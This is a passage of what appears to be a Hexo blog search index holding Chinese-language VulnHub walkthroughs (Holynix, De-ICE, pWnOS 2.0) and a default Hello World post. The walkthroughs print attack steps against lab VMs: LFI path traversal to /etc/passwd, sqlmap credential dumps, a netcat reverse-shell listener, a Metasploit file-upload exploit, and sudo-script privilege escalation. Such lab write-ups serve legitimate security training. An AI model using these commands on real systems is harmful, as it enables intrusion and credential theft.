请求中传递的参数是 text <strong>_file_name&#x3D;ssp%2Femail.txt&amp;B&#x3D;Display+File</strong></p><p>![image-20220606151955650](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606151955650.png)</p></li><li><p>抓包改包</p><blockquote><p>正如我们所知，本网站存在 LFI&#x2F;RFI 漏洞。因此，让我们尝试修改 Burpsuite 的 POST 请求中传递的参数如下</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text_file_name=ssp%2F../../../../../../../../../../etc/passwd&amp;B=Display+File</span><br></pre></td></tr></table></figure><p>![image-20220606152443735](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606152443735.png)</p></li></ol><h3 id="2-5-获得了完整的用户列表，让我们先随机选择一个用户"><a href="#2-5-获得了完整的用户列表，让我们先随机选择一个用户" class="headerlink" title="2.5 获得了完整的用户列表，让我们先随机选择一个用户"></a>2.5 获得了完整的用户列表，让我们先随机选择一个用户</h3><ol><li><p>使用sqlmap 获取其他信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.1.12/index.php?page=login.php --forms --data=&quot;username=gmckinnon&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p>![image-20220606152917533](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606152917533-16545005612701.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.1.12/index.php?page=login.php --forms --data=&quot;username=etenenbaum&quot; -D creds --tables --dump --batch</span><br></pre></td></tr></table></figure><p>![image-20220606153213438](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606153213438.png)</p><blockquote><p>这个密码居然没有使用md5加密</p></blockquote><p>![image-20220606154509343](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606154509343.png)</p><blockquote><p>我们在 Kali 机器上启动了 netcat 监听器。执行文件<strong>shell.php</strong>（如浏览器中所示）后，我们获得了有限的 shell 访问权限</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure><p>![image-20220606155150187](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606155150187.png)</p><p>![image-20220606155444134](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606155444134.png)</p></li></ol><blockquote><p>打开临时目录tmp</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/</span><br></pre></td></tr></table></figure><blockquote><p>将&#x2F;bin&#x2F;bash 文件复制到&#x2F;tmp文件夹</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash .</span><br></pre></td></tr></table></figure><blockquote><p>更改文件权限</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown root:root /tmp/bash</span><br></pre></td></tr></table></figure><p>![image-20220606161029343](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606161029343.png)</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.Hack the De-ICE_S1.120 VM (Boot to Root)</title>
      <link href="/2022/06/19/7.Hack%20the%20De-ICE%20S1.120%20VM%20(Boot%20to%20Root)/"/>
      <url>/2022/06/19/7.Hack%20the%20De-ICE%20S1.120%20VM%20(Boot%20to%20Root)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-De-ICE-S1-120-VM-Boot-to-Root"><a href="#Hack-the-De-ICE-S1-120-VM-Boot-to-Root" class="headerlink" title="Hack the De-ICE: S1.120 VM (Boot to Root)"></a>Hack the De-ICE: S1.120 VM (Boot to Root)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/de-ice-s1120,10/">https://www.vulnhub.com/entry/de-ice-s1120,10/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（Nmap、netdiscover）</li><li>SQLMAP 扫描</li><li>提取数据库和用户凭据</li><li>使用特定用户对目标进行 SSH 访问</li><li>使用 SUID 位和 SUDO 二进制文件利用目标</li><li>获取 Root 访问权限并捕获标志。</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1-局域网中寻找目标靶机"><a href="#2-1-局域网中寻找目标靶机" class="headerlink" title="2.1 局域网中寻找目标靶机"></a>2.1 局域网中寻找目标靶机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>![image-20220607113544782](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607113544782.png)</p><blockquote><p>为什么这么肯定，是因为实现已经知道这个是固定ip 192.168.1.120</p></blockquote><h3 id="2-2-nmap对目标主机进行扫描"><a href="#2-2-nmap对目标主机进行扫描" class="headerlink" title="2.2 nmap对目标主机进行扫描"></a>2.2 nmap对目标主机进行扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namp -A 192.168.1.120    # 全面扫描</span><br><span class="line">nmap -Pn -sV 192.168.1.120 # 精简化扫描</span><br></pre></td></tr></table></figure><p>![image-20220607113839754](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607113839754.png)</p><p>![image-20220607113929650](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607113929650.png)</p><blockquote><p>通过 nmap 扫描，发现端口 80、443、3306、21、22 处于打开状态。</p></blockquote><h3 id="2-3-针对80端口的http服务进行测试"><a href="#2-3-针对80端口的http服务进行测试" class="headerlink" title="2.3 针对80端口的http服务进行测试"></a>2.3 针对80端口的http服务进行测试</h3><blockquote><p>首先使用浏览器浏览 <a href="http://192.168.1.120/">http://192.168.1.120</a> 浏览目标站点 </p></blockquote><p>![image-20220607114218532](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607114218532.png)</p><p>![image-20220607114350759](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607114350759.png)</p><p>![image-20220607114423975](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607114423975.png)</p><blockquote><p>提交表单</p></blockquote><p>![image-20220607114459575](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607114459575.png)</p><p>![image-20220607114624865](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607114624865.png)</p><blockquote><p>发现疑似注入点</p></blockquote><h3 id="2-4-sqlmap-针对疑似注入点进行爆破"><a href="#2-4-sqlmap-针对疑似注入点进行爆破" class="headerlink" title="2.4 sqlmap 针对疑似注入点进行爆破"></a>2.4 sqlmap 针对疑似注入点进行爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.120/products.php?id=1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p>![image-20220607115149761](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607115149761-16545739112791.png)</p><blockquote><p>发现服务器存在的数据库</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.1.120/products.php?id=1 -D mysql --users --passwords --batch</span><br></pre></td></tr></table></figure><p>![image-20220607115951513](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607115951513.png)</p><blockquote><p>存在的系统用户</p></blockquote><p>![image-20220607120105986](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607120105986.png)</p><blockquote><p>破解出来的用户名和密码</p></blockquote><h3 id="2-5-尝试ssh进行登录"><a href="#2-5-尝试ssh进行登录" class="headerlink" title="2.5 尝试ssh进行登录"></a>2.5 尝试ssh进行登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh xxx@192.168.1.120</span><br></pre></td></tr></table></figure><p>![image-20220607120449916](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607120449916.png)</p><blockquote><p>使用之前mysql中报出来的用户名和密码就行 这里的用户名密码，就直接是系统的用户名和密码</p></blockquote><h3 id="2-6-SUID-提权"><a href="#2-6-SUID-提权" class="headerlink" title="2.6 SUID 提权"></a>2.6 SUID 提权</h3><blockquote><p>枚举具有SUID权限的二进制文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>![image-20220607122302870](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607122302870.png)</p><p>![image-20220607122422466](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607122422466.png)</p><blockquote><p>在执行 sudo –l 时，我们观察到在执行命令 &#x2F;home&#x2F;ccoffee&#x2F;scripts&#x2F;getlogs.sh 时没有为该用户设置密码（NOPASSWD）（即他也可以作为 sudo 运行，与 SUID 位相同的脚本也设置）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home/ccoffee/scripts/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure><blockquote><p>将 getlogs.sh 移动到 getlogs.sh.bak，然后使用以下代码创建一个新的 getlogs.sh 文件以生成 shell</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv getlogs.sh getlogs.sh.bak</span><br><span class="line">echo &quot;/bin/bash&quot; &gt;  getlogs.sh</span><br><span class="line">chmod 777 getlogs.sh</span><br></pre></td></tr></table></figure><p>![image-20220607122831141](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607122831141.png)</p><p>![image-20220607122931206](7.Hack the De-ICE S1.120 VM (Boot to Root).assets&#x2F;image-20220607122931206.png)</p><h3 id="2-7-拿到root权限，挑战结束"><a href="#2-7-拿到root权限，挑战结束" class="headerlink" title="2.7 拿到root权限，挑战结束"></a>2.7 拿到root权限，挑战结束</h3>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.Hack the pWnOS_2.0 (Boot 2 Root Challenge)</title>
      <link href="/2022/06/19/6.Hack%20the%20pWnOS%202.0%20(Boot%202%20Root%20Challenge)/"/>
      <url>/2022/06/19/6.Hack%20the%20pWnOS%202.0%20(Boot%202%20Root%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-pWnOS-2-0-Boot-2-Root-Challenge"><a href="#Hack-the-pWnOS-2-0-Boot-2-Root-Challenge" class="headerlink" title="Hack the pWnOS: 2.0 (Boot 2 Root Challenge)"></a>Hack the pWnOS: 2.0 (Boot 2 Root Challenge)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/">https://www.vulnhub.com/entry/pwnos-20-pre-release,34/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.<strong>渗透方法</strong></h2><ul><li>网络扫描（Nmap、netdiscover）</li><li>目录破坏服务器</li><li>获取登录凭据 (Metasploit)</li><li>上传PHP反向shell</li><li>获得限量壳牌</li><li>枚举根凭证</li><li>获取根</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2. 渗透流程"></a>2. 渗透流程</h2><h3 id="2-1-在局域网内找到目标主机"><a href="#2-1-在局域网内找到目标主机" class="headerlink" title="2.1 在局域网内找到目标主机"></a>2.1 在局域网内找到目标主机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>![image-20220606214027850](6.Hack the pWnOS 2.0 (Boot 2 Root Challenge).assets&#x2F;image-20220606214027850.png)</p><h3 id="2-2-nmap扫描目标主机"><a href="#2-2-nmap扫描目标主机" class="headerlink" title="2.2 nmap扫描目标主机"></a>2.2 nmap扫描目标主机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV 10.10.10.100</span><br></pre></td></tr></table></figure><p>![image-20220606215704472](6.Hack the pWnOS 2.0 (Boot 2 Root Challenge).assets&#x2F;image-20220606215704472.png)</p><h3 id="2-3-浏览器访问80端口"><a href="#2-3-浏览器访问80端口" class="headerlink" title="2.3 浏览器访问80端口"></a>2.3 浏览器访问80端口</h3><blockquote><p>发现欢迎页面</p></blockquote><p>![image-20220606220007524](6.Hack the pWnOS 2.0 (Boot 2 Root Challenge).assets&#x2F;image-20220606220007524.png)</p><h3 id="2-4-进行web目录扫描"><a href="#2-4-进行web目录扫描" class="headerlink" title="2.4 进行web目录扫描"></a>2.4 进行web目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.100</span><br></pre></td></tr></table></figure><p>![image-20220606220311496](6.Hack the pWnOS 2.0 (Boot 2 Root Challenge).assets&#x2F;image-20220606220311496.png)</p><blockquote><p>发现blog目录 和includes目录</p></blockquote><p>![image-20220607085017983](6.Hack the pWnOS 2.0 (Boot 2 Root Challenge).assets&#x2F;image-20220607085017983.png)</p><p>![image-20220607085146767](6.Hack the pWnOS 2.0 (Boot 2 Root Challenge).assets&#x2F;image-20220607085146767.png)</p><blockquote><p>网站运行在 Simple PHP Blog 和版本 0.4.0</p></blockquote><h3 id="2-5-Metasploit-搜索sphpblog漏洞并进行利用"><a href="#2-5-Metasploit-搜索sphpblog漏洞并进行利用" class="headerlink" title="2.5 Metasploit 搜索sphpblog漏洞并进行利用"></a>2.5 Metasploit 搜索sphpblog漏洞并进行利用</h3><p>![image-20220607085604324](6.Hack the pWnOS 2.0 (Boot 2 Root Challenge).assets&#x2F;image-20220607085604324.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/sphpblog_file_upload</span><br><span class="line">set rhost 10.10.10.100</span><br><span class="line">set uri /blog</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><blockquote><p>这个漏洞没有给我们和任何bash，但它创建了一个登录凭据</p></blockquote><p>![image-20220607090053170](6.Hack the pWnOS 2.0 (Boot 2 Root Challenge).assets&#x2F;image-20220607090053170.png)</p><blockquote><p>获得一组不同的登录凭据，因为漏洞利用每次都会生成它们唯一的</p></blockquote><p>![image-20220607090244725](6.Hack the pWnOS 2.0 (Boot 2 Root Challenge).assets&#x2F;image-20220607090244725.png)</p><blockquote><p>使用生成的用户名密码登录到系统</p></blockquote><blockquote><p>无法登录换条路走</p></blockquote><p>![image-20220607093555025](6.Hack the pWnOS 2.0 (Boot 2 Root Challenge).assets&#x2F;image-20220607093555025.png)</p><h1 id="未完"><a href="#未完" class="headerlink" title="未完"></a>未完</h1>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/06/08/hello-world/"/>
      <url>/2022/06/08/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
